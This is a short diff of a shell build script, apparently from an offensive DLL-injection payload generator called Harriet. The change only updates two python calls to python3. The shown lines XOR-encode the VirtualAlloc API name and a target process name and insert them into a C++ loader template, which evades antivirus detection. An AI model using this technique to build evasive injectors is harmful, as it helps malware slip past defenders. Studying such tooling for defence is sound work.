@@ -121,7 +121,7 @@ rm virt*
 #VIRTUALALLOC - XOR String
 
 echo VirtualAlloc > virt.txt
-python Harriet/DLLInj/Resources/xor.py virt.txt > virtalloc.txt
+python3 Harriet/DLLInj/Resources/xor.py virt.txt > virtalloc.txt
 virt=$(cat virtalloc.txt)
 virt2="${virt::-8}" 
 sed -i "s/VIRALO/$virt2/g" Harriet/DLLInj/Resources/template.cpp 
@@ -130,7 +130,7 @@ rm virt*
 #PROCESS STRING
 
 echo $SVCHOST > proc.txt
-python Harriet/DLLInj/Resources/xor.py proc.txt > proc2.txt
+python3 Harriet/DLLInj/Resources/xor.py proc.txt > proc2.txt
 process=$(cat proc2.txt)
 process2="${process::-8}" 
 sed -i "s/PROCY/$process2/g" Harriet/DLLInj/Resources/template.cpp 
